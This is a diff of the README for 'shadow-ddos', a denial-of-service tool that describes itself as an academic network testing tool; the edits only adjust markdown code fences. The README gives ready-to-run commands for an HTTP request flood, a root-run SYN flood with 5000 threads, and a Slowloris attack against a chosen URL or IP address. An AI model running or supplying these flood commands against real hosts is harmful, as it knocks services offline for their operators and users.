@@ -19,7 +19,8 @@ SHADOW is a high-performance network testing tool developed for academic purpose
    git clone [https://github.com/username/shadow-ddos.git](https://github.com/username/shadow-ddos.git)
    cd shadow-ddos
 2. Install dependencies:
-pip install -r requirements.txt
+   ```bash
+   pip install -r requirements.txt
 
 📖 Usage
 Run the tool with the following arguments:
@@ -28,16 +29,15 @@ python shadow_ddos.py -d <target_url/ip> [options]
 
 Examples:
 HTTP Request Flood:
-
-Bash
+```bash
 python shadow_ddos.py -d [www.example.com](https://www.example.com) -T 2000 -Request
 SYN Flood (Requires Root/Sudo):
 
-Bash
+```bash
 sudo python shadow_ddos.py -d 192.168.1.1 -T 5000 -Synflood
 Slowloris Attack (Pyslow):
 
-Bash
+```bash
 python shadow_ddos.py -d [www.example.com](https://www.example.com) -p 80 -T 500 -Pyslow
 
 📊 Technical Overview
